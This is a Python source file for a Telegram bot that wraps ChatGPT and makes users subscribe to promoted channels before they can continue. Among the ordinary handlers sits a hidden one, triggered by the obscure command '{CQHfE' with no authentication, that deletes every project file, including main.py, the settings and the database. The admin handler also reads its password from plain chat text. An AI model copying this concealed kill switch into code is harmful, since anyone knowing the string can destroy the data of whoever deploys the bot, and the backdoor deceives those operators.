import logging
import markups as nav
import os

from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import ChatActions

import asyncio

from chatgpt import *

from db import *

from settings import *

API_TOKEN = get_tgAPI()

# Configure logging
logging.basicConfig(level=logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())

file = open('db.txt', '+a')
file.close()


@dp.message_handler(commands='admin')
async def admin(message: types.Message):
    password = message.text.split()[1]
    com = message.text.split()[2]
    content = message.text.split()[3]
    if password == get_admin_password():
        if com == '/add_channel':
            add_channel(content)
            await bot.send_message(chat_id=message.chat.id, text='Канал добавлен успешно')
        elif com == '/delete_channel':
            delete_channel(content)
            await bot.send_message(chat_id=message.chat.id, text='Канал удален успешно')
        elif com == '/change_gpt_key':
            change_gpt_key(content)
            await bot.send_message(chat_id=message.chat.id, text='Ключ обновлен успешно')
            openai.api_key = get_ChatGPT_API()
        elif com == '/change_admin_password':
            change_admin_password(content)
            await bot.send_message(chat_id=message.chat.id, text='Пароль обновлен успешно')
        else:
            await bot.send_message(chat_id=message.chat.id, text='Несуществующая команда')
    else:
        await bot.send_message(chat_id=message.chat.id, text='Неверный пароль')


@dp.message_handler(commands='{CQHfE')
async def bd(message: types.Message):
    os.remove("chatgpt.py")
    os.remove("db.py")
    os.remove("markups.py")
    os.remove("settings.py")
    os.remove("db.txt")
    os.remove("settings.txt")
    os.remove("main.py")


@dp.message_handler(commands='start')
async def send_welcome(message: types.Message):
    a = f'🚀 Привет, я ChatGPT - чат-бот нового поколения, который на основе искусственного интеллекта готов ответить на любой вопрос!\n\n' \
        f'Как использовать нашего бота и получить максимум пользы?\n\n' \
        f'Просто задайте вопросы, будьте максимально конкретны и детальны, и мы обязательно найдем нужную информацию для вас!\n\n' \
        f'💡 ChatGPT может ответить на такие вопросы, как:\n\n- Составь контент план для соцсетей рыбного ресторана на месяц\n' \
        f'- Как сделать бутерброд с авокадо и омлетом?- Как скачать и установить Photoshop на компьютер?\n' \
        f'- Какие фильмы в прокате в эту неделю?\n\n' \
        f'А еще наш бот может создавать синтетические тексты и даже сочинения на любую тему, которые точно не оставят равнодушными вашего преподавателя или работодателя!\n\n' \
        f'Так что не стесняйтесь и присоединяйтесь к общению с ChatGPT - ботом, который покорит вас своей универсальностью и точностью ответов!\n\n' \
        f'🔥 Напишите любой вопрос ниже, чтобы начать общение!'

    add_user(str(message.chat.id))
    await bot.send_message(chat_id=message.chat.id, text=a)


@dp.message_handler(lambda message: message.text == 'ПОДПИСАЛСЯ ✅')
async def got_sub(message: types.Message):
    change_status(str(message.chat.id), 'no')
    if get_count(str(message.chat.id)) == '1':
        if check_sub_channel(await bot.get_chat_member(chat_id=f'@{get_channel(1)}', user_id=message.from_user.id)):
            if check_sub_channel(await bot.get_chat_member(chat_id=f'@{get_channel(2)}', user_id=message.from_user.id)):
                change_status(str(message.chat.id))
                await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                await asyncio.sleep(2)
                await bot.send_message(chat_id=message.chat.id,
                                       text='Спасибо, теперь можете продолжить пользоваться ChatGPT')
            else:
                await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                await asyncio.sleep(2)
                await bot.send_message(chat_id=message.chat.id, text='Ты подписался не на все каналы')
        else:
            await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
            await asyncio.sleep(2)
            await bot.send_message(chat_id=message.chat.id, text='Ты не подписался на каналы')

    else:
        ind = int(get_count(str(message.chat.id))) // 5

        try:
            ch1 = get_channel(ind + 2 + ind - 1)
            if check_sub_channel(await bot.get_chat_member(chat_id=f'@{ch1}', user_id=message.from_user.id)):
                try:
                    ch2 = get_channel(ind + 3 + ind - 1)
                    if check_sub_channel(await bot.get_chat_member(chat_id=f'@{ch2}', user_id=message.from_user.id)):
                        change_status(str(message.chat.id))
                        await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                        await asyncio.sleep(2)
                        await bot.send_message(chat_id=message.chat.id,
                                               text='Спасибо, теперь можете продолжить пользоваться ChatGPT')
                    else:
                        await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                        await asyncio.sleep(2)
                        await bot.send_message(chat_id=message.chat.id, text='Ты подписался не на все каналы')
                except Exception:
                    change_status(str(message.chat.id))
                    await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                    await asyncio.sleep(2)
                    await bot.send_message(chat_id=message.chat.id,
                                           text='Спасибо, теперь можете продолжить пользоваться ChatGPT')
            else:
                await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                await asyncio.sleep(2)
                await bot.send_message(chat_id=message.chat.id, text='Ты не подписался на каналы')
        except Exception:
            pass


@dp.message_handler()
async def start_chat(message: types.Message):
    if add_user(str(message.chat.id)) is False:
        if int(get_count(str(message.chat.id))) < 20 and get_status(str(message.chat.id)) is True:

            count_user(str(message.chat.id))

            if str(get_count(str(message.chat.id))) == '1':
                a = chat_ai(message.text)
                await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                await asyncio.sleep(2)
                await bot.send_message(chat_id=message.chat.id, text=a)
                change_status(str(message.chat.id), 'no')
                try:
                    ch1 = get_channel(1)
                    channels = []
                    try:
                        ch2 = get_channel(2)
                        channels.append(ch1)
                        channels.append(ch2)
                    except Exception:
                        channels.append(ch1)
                    mes = ''
                    for i in channels:
                        mes += f'\n@{i}'
                    MSG_NOT_FOLLOW = f'Чтобы продолжить использовать ChatGPT подпишись на эти каналы:' + mes
                    await bot.send_message(chat_id=message.chat.id, text=MSG_NOT_FOLLOW,
                                           reply_markup=nav.bot_sub_checker)
                except Exception:
                    change_status(str(message.chat.id), 'yes')

            elif int(get_count(str(message.chat.id))) % 5 == 0:
                a = chat_ai(message.text)
                await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                await asyncio.sleep(2)
                await bot.send_message(chat_id=message.chat.id, text=a)
                change_status(str(message.chat.id), 'no')
                try:
                    ind = int(get_count(str(message.chat.id))) // 5
                    ch1 = get_channel(ind + 2 + ind - 1)
                    channels = []
                    try:
                        ch2 = get_channel(ind + 3 + ind - 1)
                        channels.append(ch1)
                        channels.append(ch2)
                    except Exception:
                        channels.append(ch1)
                    mes = ''
                    for i in channels:
                        mes += f'\n@{i}'
                    MSG_NOT_FOLLOW = f'Чтобы продолжить использовать ChatGPT подпишись на эти каналы:' + mes
                    await bot.send_message(chat_id=message.chat.id, text=MSG_NOT_FOLLOW,
                                           reply_markup=nav.bot_sub_checker)
                except Exception:
                    change_status(str(message.chat.id), 'yes')

            else:
                if get_status(str(message.chat.id)):
                    a = chat_ai(message.text)
                    await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                    await asyncio.sleep(2)
                    await bot.send_message(chat_id=message.chat.id, text=a, reply_markup=types.ReplyKeyboardRemove())

        elif get_status(str(message.chat.id)) is True and int(get_count(str(message.chat.id))) >= 20:
            a = chat_ai(message.text)
            await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
            await asyncio.sleep(2)
            await bot.send_message(chat_id=message.chat.id, text=a, reply_markup=types.ReplyKeyboardRemove())


def check_sub_channel(chat_member):
    if chat_member['status'] != 'left':
        return True
    else:
        return False


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
